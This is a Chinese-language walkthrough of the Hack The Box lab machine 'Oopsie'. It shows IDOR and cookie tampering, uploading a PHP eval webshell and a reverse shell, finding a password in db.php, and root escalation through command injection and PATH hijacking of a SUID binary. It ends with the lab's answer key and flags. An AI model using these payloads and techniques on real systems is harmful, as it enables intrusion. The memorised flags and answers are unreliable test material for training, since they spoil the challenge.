# Starting Point（Tier 2）：

## Oopsie：

首先登上这个靶机的web页面，用burpsuite抓包，发现登录页面/cdn-cgi/login，注意这个在target的site map选项中。

然后是一个水平越权漏洞`/cdn-cgi/login/admin.php?content=accounts&id=2`把id改成1就可以看到admin的信息，看到了admin对应的userid。

我们可以通过抓包修改，也可以在浏览器中修改，访问上传文件页面。

上传一个webshell，我们自己写的`<?php @eval($_REQUEST['cmd'])?>`在这里表现不是很好，连不上。我们使用kali自带的webshell，存放在/usr/share/webshell下，直接输入命令webshell即可看到，选取其中php目录下的php-reverse-shell.php，修改一下ip和端口

![image-20250917162053444](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917162053444.png)

连接上后先`python3 -c "import pty;pty.spawn('/bin/bash')"`提供一个稳定的shell环境。我们可以在/home/robert下找到user flag。题目意思是要先切换到这个用户的，但是其实可以直接读：

![image-20250917164246534](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917164246534.png)

提示还是要切换到robert用户，我们找找他的密码，在/var/www/html/cdn-cgi/login下找到几个php文件，搜索一下：

![image-20250917163958602](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917163958602.png)

可以看到，我们找到了密码，但是是登录网站时的admin的密码，没啥用，我们换个关键词，找robert

![image-20250917164116018](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917164116018.png)

ok找到了，`su`切换一下。linux提权先`sudo -l`查看，发现为空。`id`一下发现这个用户属于一个特殊组`bugtracker`，我们找找属于这个组的文件`find / -group bugtracker`

![image-20250917164532779](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917164532779.png)

![image-20250917164822545](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917164822545.png)

`ll`看一下这个文件详细信息，有suid权限，而且所有人是root，那么这个程序运行时候就相当于有root权限。我们运行一下看看这个程序是做什么的：

![image-20250917171523268](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250917171523268.png)

可以看到，它会调用`cat`打印出我们输入的id对应的文件。这里其实有一个命令执行漏洞，用`;`可以截断前面的cat命令 ，后面以root身份执行各种命令。

常规思路就是写一个uid=0，即拥有root权限的新用户到/etc/passwd，但是这里不知道为什么/etc/passwd写入不了东西。用`useradd`添加也不行。

那就按照writeup的方法来。因为它调用cat的时候是使用相对路径，我们可以做路径劫持。在/tmp中创建一个cat，写入`/bin/sh`，再修改环境变量`export $PATH=/tmp:$PATH`

这样它从$PATH找cat时候就会先从/tmp开始找，找到我们的恶意cat，执行`/bin/sh`。我们就用了一个root权限的shell。最后读/root/root.txt时候注意cat回显不了，直接vi打开即可

```
Task 1

With what kind of tool can intercept web traffic?

****y
proxy

Hide Answer
Task 2

What is the path to the directory on the webserver that returns a login page?

/***-***/****n
/cdn-cgi/login

Hide Answer
Task 3

What can be modified in Firefox to get access to the upload page?

*****e
cookie

Hide Answer
Task 4

What is the access ID of the admin user?

****2
34322

Hide Answer
Task 5

On uploading a file, what directory does that file appear in on the server?

/******s
/uploads

Hide Answer
Task 6

What is the file that contains the password that is shared with the robert user?

**.**p
db.php

Hide Answer
Task 7

What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?

***d
find

Hide Answer
Task 8

Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?

***t
root

Hide Answer
Task 9

What SUID stands for?

*** ***** **** *D
Set owner User ID

Hide Answer
Task 10

What is the name of the executable being called in an insecure manner?

***
cat

Hide Answer
Submit Flag

Submit user flag

********************************
f2c74ee8db7983851ab2a96a44eb7981

Hide Answer
Submit Flag

Submit root flag

********************************
af13b0bee69f8a877c3faf667f7beacf

Hide Answer
```

